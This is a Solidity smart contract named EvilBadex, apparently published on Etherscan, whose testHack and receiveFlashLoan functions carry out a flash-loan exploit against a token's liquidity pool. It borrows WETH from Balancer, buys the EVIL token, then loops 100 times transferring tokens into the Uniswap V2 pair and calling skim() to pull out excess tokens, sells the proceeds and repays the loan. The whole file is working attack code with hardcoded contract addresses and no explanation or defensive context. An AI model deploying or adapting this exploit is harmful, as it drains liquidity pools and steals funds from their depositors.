/**
 *Submitted for verification at Etherscan.io on 2023-02-15
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.12;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
}

interface Badex {
    function myPush(address _address) external view returns (uint256);

    function getUNIV2Liquidity() external view returns (uint256);
}

interface IUniswapV2Pair {
    function symbol() external view returns (string memory);

    function skim(address to) external;

    function sync() external;

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function nonces(address owner) external view returns (uint256);
}

interface iPancakeRouter {
    function getAmountsOut(uint256 amountIn, address[] memory path)
        external
        view
        returns (uint256[] memory amounts);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function WETH() external pure returns (address);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract EvilBadex {
    //contoh deklarasi address
    uint256 initialBuy = 4000000000000000000;
    address LP_ADDRESS = 0x09CD30D9162e8619b03Df7aE9229B4e719582c8C; // address LP EVILBadex
    address EVIL = 0x9255590C2e66aBb441A9b19A8c518E12FBD5c4d3; // address EVILBadex
    address WETH = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6; // address WETH
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    IBalancerVault private constant balancerVault =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    function approve(
        address _tokenAddress,
        address _spender,
        uint256 _amounts
    ) external returns (bool approved) {
        approved = IERC20(_tokenAddress).approve(_spender, _amounts);
    }

    function sell(
        uint256 _amountIn,
        uint256 _amountOutMin,
        address[] memory _path
    ) external payable {
        iPancakeRouter(_router)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                _amountIn,
                _amountOutMin,
                _path,
                address(this),
                block.timestamp
            );
    }

    function buy(
        uint256 _amountIn,
        uint256 _amountOutMin,
        address[] memory _path
    ) external payable {
        iPancakeRouter(_router)
            .swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: _amountIn
        }(_amountOutMin, _path, address(this), block.timestamp);
    }

    function buy2(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory _path
    ) external payable {
        iPancakeRouter(_router).swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            _path,
            address(this),
            block.timestamp
        );
    }

    function testHack() external {
        // flashloan 2 weth dari balancer
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 10 ether;
        balancerVault.flashLoan(address(this), tokens, amounts, "");

    }

    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) external payable {
        // uint256 ethAmt = msg.value;
        this.approve(
            0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6,
            _router,
            ~uint256(0)
        );

        address[] memory path;
        path = new address[](2);
        path[0] = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6;
        path[1] = 0x9255590C2e66aBb441A9b19A8c518E12FBD5c4d3;
        
        this.buy2(IERC20(WETH).balanceOf(address(this)), 0, path);

        // Step 1
        IERC20(0x9255590C2e66aBb441A9b19A8c518E12FBD5c4d3).transfer(
            0x09CD30D9162e8619b03Df7aE9229B4e719582c8C,
            IERC20(0x9255590C2e66aBb441A9b19A8c518E12FBD5c4d3).balanceOf(
                address(this)
            )
        );

        IUniswapV2Pair(0x09CD30D9162e8619b03Df7aE9229B4e719582c8C).skim(
            address(this)
        );

        IERC20(0x9255590C2e66aBb441A9b19A8c518E12FBD5c4d3).transfer(
            address(this),
            0
        );

        // uint256 tfAmt = IERC20(0x9255590C2e66aBb441A9b19A8c518E12FBD5c4d3).balanceOf(address(this)) / x;
        for (uint256 i = 0; i < 100; i++) {
            if (
                IERC20(EVIL).balanceOf(LP_ADDRESS) <
                IERC20(EVIL).balanceOf(address(this))
            ) {
                IERC20(EVIL).transfer(
                    LP_ADDRESS,
                    IERC20(EVIL).balanceOf(address(LP_ADDRESS))
                );
            } else {
                IERC20(EVIL).transfer(
                    LP_ADDRESS,
                    IERC20(EVIL).balanceOf(address(this))
                );
            }

            IUniswapV2Pair(0x09CD30D9162e8619b03Df7aE9229B4e719582c8C).skim(
                address(this)
            );

            IERC20(0x9255590C2e66aBb441A9b19A8c518E12FBD5c4d3).transfer(
                address(this),
                0
            );
        }

        this.approve(
            0x9255590C2e66aBb441A9b19A8c518E12FBD5c4d3,
            _router,
            ~uint256(0)
        );
        address[] memory pathSell;
        pathSell = new address[](2);
        pathSell[0] = 0x9255590C2e66aBb441A9b19A8c518E12FBD5c4d3;
        pathSell[1] = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6;
        this.sell(
            IERC20(0x9255590C2e66aBb441A9b19A8c518E12FBD5c4d3).balanceOf(
                address(this)
            ),
            0,
            pathSell
        );

        IERC20(0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6).transfer(
            address(balancerVault),
            amounts[0]
        );
    }

    function transfer(
        address _tokenAddress,
        address recipient,
        uint256 _amounts
    ) external returns (bool transfered) {
        transfered = IERC20(_tokenAddress).transfer(recipient, _amounts);
    }

}